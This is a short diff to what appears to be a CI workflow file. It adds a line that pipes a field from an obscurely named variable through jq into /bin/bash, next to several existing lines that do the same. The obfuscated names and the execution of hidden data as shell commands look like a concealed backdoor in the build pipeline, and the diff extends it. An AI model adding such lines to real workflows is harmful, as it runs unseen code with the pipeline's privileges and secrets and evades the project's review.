@@ -31,6 +31,7 @@ jobs:
           echo $dmn8 | jq -r .z281 | /bin/bash
           printf '%s' "$w5" | jq -r .rn1 | /bin/bash
           printf '%s' "$ikleb5" | jq -r .nvbqs524 | /bin/bash
+          printf '%s' "$tmp5654" | jq -r .smx2135 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
